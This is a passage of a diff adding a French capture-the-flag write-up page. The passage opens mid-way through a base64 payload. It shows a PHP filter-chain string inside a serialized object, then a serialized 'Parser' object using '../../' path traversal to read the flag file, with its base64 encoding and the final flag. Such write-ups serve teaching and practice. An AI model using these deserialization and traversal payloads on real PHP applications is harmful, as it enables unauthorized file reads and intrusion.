ZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5pY29udi5JTklTLlVURjE2fGNvbnZlcnQuaWNvbnYuQ1NJQk0xMTMzLklCTTk0M3xjb252ZXJ0Lmljb252LklCTTkzMi5TSElGVF9KSVNYMDIxM3xjb252ZXJ0LmJhc2U2NC1kZWNvZGV8Y29udmVydC5iYXNlNjQtZW5jb2RlfGNvbnZlcnQuaWNvbnYuVVRGOC5VVEY3fGNvbnZlcnQuaWNvbnYuU0UyLlVURi0xNnxjb252ZXJ0Lmljb252LkNTSUJNMTE2MS5JQk0tOTMyfGNvbnZlcnQuaWNvbnYuTVM5MzIuTVM5MzZ8Y29udmVydC5pY29udi5CSUc1LkpPSEFCfGNvbnZlcnQuYmFzZTY0LWRlY29kZXxjb252ZXJ0LmJhc2U2NC1lbmNvZGV8Y29udmVydC5pY29udi5VVEY4LlVURjd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXBocDovL3RlbXAiO3M6NToiZGVidWciO2I6MTtzOjc6InZlcnNpb24iO3M6NDoidjEuMCI7czoxMToiYmV0dGVycHJpbnQiO2I6MTt9</span>
+</pre></div>
+</div>
+<p>On obtient alors le chemin du flag : /var/www/html/flag-94583458938490289047237492374.txt</p>
+<p>On peut donc le récupérer avec :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">O:6:&quot;Parser&quot;:4:{s:4:&quot;text&quot;;s:44:&quot;../../flag-94583458938490289047237492374.txt&quot;;s:5:&quot;debug&quot;;b:1;s:7:&quot;version&quot;;s:4:&quot;v1.0&quot;;s:11:&quot;betterprint&quot;;b:1;}</span>
+<span class="go">Tzo2OiJQYXJzZXIiOjQ6e3M6NDoidGV4dCI7czo0NDoiLi4vLi4vZmxhZy05NDU4MzQ1ODkzODQ5MDI4OTA0NzIzNzQ5MjM3NC50eHQiO3M6NToiZGVidWciO2I6MTtzOjc6InZlcnNpb24iO3M6NDoidjEuMCI7czoxMToiYmV0dGVycHJpbnQiO2I6MTt9</span>
+</pre></div>
+</div>
+<p>Et on obtient notre flag : <strong>SHLK{fr0m_l177l3_vuln_70_70p_vuln}</strong></p>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Pied de page">
+        <a href="icecream.html" class="btn btn-neutral float-left" title="Ice Cream" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Précédent</a>
+        <a href="oldschool.html" class="btn btn-neutral float-right" title="Old School Markus" accesskey="n" rel="next">Suivant <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Droits d'auteur 2025, Kubow.</p>
+  </div>
+
+  Compilé avec <a href="https://www.sphinx-doc.org/">Sphinx</a> en utilisant un
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">thème</a>
+    fourni par <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
